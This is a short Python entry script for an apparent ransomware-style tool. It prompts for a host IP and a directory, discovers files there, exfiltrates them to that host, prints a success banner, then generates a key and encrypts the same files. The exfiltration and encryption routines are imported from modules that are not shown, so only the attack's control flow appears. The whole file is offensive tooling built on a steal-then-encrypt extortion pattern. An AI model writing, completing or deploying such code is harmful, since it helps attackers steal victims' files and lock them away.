import sys

from time import sleep

from Output import Output
from input import params
from discover_files import discover_files
from exfiltration import exfiltrate
from encryption import encrypt, key_generate


def main():
    """The main routine."""

    # Creates Output instance for printing header and footer of console output
    out = Output()
    out.printHeader()

    # requests the ip-address and path to exfiltrate
    host_ip, path = params()

    ex_files = discover_files(path)

    exfiltrate(host_ip, ex_files, path)

    print("#####################################################")
    print("Exfiltration successfully executed")
    print("#####################################################")

    key = key_generate()

    encrypt(ex_files, key)

    out.printExecutionTime()


if __name__ == "__main__":
    sys.exit(main())
